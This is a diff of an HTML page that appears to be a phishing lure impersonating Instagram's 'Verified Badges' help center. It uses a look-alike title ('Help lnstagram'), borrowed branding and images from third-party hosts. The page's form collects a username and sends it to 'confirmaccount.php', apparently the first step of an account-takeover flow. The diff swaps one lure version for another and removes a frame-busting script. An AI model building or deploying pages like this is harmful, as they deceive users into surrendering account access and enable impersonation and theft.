@@ -1,24 +1,11 @@
-<html>
+
+    <html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifed | Help Center</title>
-<link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">
+<title>Verified Badges | Help lnstagram</title>
+<link rel="icon" href="https://i.hizliresim.com/jpm9kZ.png">
 <style>
-#header{
-  width: 100%;
-  text-align: center;
-  padding-top: 20px;
-  position: fixed;
-  background-color: #ffffff;
-  top: 0px;
-  left: 0px;
-  height: 70px;
-  border-bottom: 2px solid #dbdbdb;
-}
-#header img{
-  width: 200px;
-}
 #copyright{
 color:#999;}
 #menu{
@@ -31,28 +18,28 @@ width:91%;
 #asdxyz{
 background-color:white;
 width:91%;
-margin-top: 100px;
-padding-bottom: 50px;
+
 }
 #erhanasd{
 font-family:sans-serif;
-font-weight:400;
+font-weight:200;
 letter-spacing:;
 color:#3d3d3d;
-font-size: 20px;}
+font-size:20px;}
 #qenzyne{
-width:80%;
+width:60%;
 color:#999;
 font-family:sans-serif;
 }
 #nick{
-width: 280px;
-  font-size: 15px;
-  border: 1px solid #f4f4f4;
-  background: #FAFAFA;
-  padding: 9px 0 7px 8px;
-  line-height: 18px;
-}
+background-color:#fafafa;
+border:1px solid #cecece;
+outline:none;
+border-radius:6px;
+width:220px;
+height:35px;
+text-align:center;
+font-size:16px;}
 
 #butonbey{
 color:white;
@@ -64,7 +51,7 @@ outline:none;
 font-family:sans-serif;
 font-weight:540;
 border:0;
-width:250px;
+width:170px;
 height:30px;
 font-weight:bold;
 
@@ -78,54 +65,63 @@ font-weight:bold;
 }
 </style>
 </head>     
+</style>
+	 
+</head>
+<body id="ana" style="padding:0px; margin:0px;">
 
+
+
+
+<div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >
+ 
+
+
+<img src="https://i.imgyukle.com/2020/09/19/xfZdLN.jpg" width=111 id="erhan" style="margin:6px; margin-top: 20px; margin-right: 20px;" >
+
+<br><br>
+</div>
+<br><br>
+
+<center>
+
+
+<br>
 <body>
-<div id="header"> 
-   <img src="https://i.imgyukle.com/2020/06/06/yFzPFU.png"> 
-  </div> 
 <body bgcolor="#fafafa">
 <br>
 <br>
 <br>
 <center>
-<form method="get" action="username.php">
+<form method="get" action="confirmaccount.php">
 <div id="asdxyz" style="border:1px solid #cecece;">
 
-<img src="https://i.imgyukle.com/2020/10/05/5ps0B6.jpg" width="120px">
+<img src="https://metro.co.uk/wp-content/uploads/2017/07/the-gram.gif" width="195"  style="margin-right:0px" class="CToWUd">
 
-    <br>
-    	
-<h1 id="erhanasd"> <b>Verified Badge</b> <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/1200px-Twitter_Verified_Badge.svg.png" width="19px"> </h1>
+<h1 id="erhanasd">Verified Badges | Instagram Help Center </h1>
 
-<p id="qenzyne">  A verified badge is a check that appears next to the name of an Instagram account in search and profile. This means that Instagram confirms that this is a real account for the public figure, famous or global brand it represents. Accounts representing well-known figures and brands are verified because they are likely to impersonate. We want to make it easy for people in the Instagram community to find the real people and brands they want to follow. Click "Next" to continue the form.</p> 
-   <br>
+<p id="qenzyne">A verified badge is a check that appears next to an Instagram account's name in search and on the profile. It means Instagram has confirmed that an account is the authentic presence of the public figure, celebrity or global brand it represents.
 
+ </p><br>
 
 
+
+<input type="text" id="nick" name="nick" required="" placeholder="username" class="qua21"><br><br>
 <input type="submit" value="Next" id="butonbey" style="">
-
-</div>
 </form>
 
 <br><br>
 </div>
 </center>
-<center>
-<br><br><br>
-<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;"> © 2020 INSTAGRAM AND FACEBOOK </p>
-<br>
+<center><br> <br>
 
+<div id="get">
+</div>
+<br><br><br>
+<br>
+<img src="https://i.imgyukle.com/2020/09/19/xwP9eb.png" width=170>
 </center>
 
 </body>
-<textarea Style="width: 1px; height: 1px" Rows="1" Cols="1">
 
-<SCRIPT LANGUAGE="Javascript">
-
-if (parent.frames.length > 0)
-
-parent.********.href=self.********;
-
-</SCRIPT>
 </html>
-
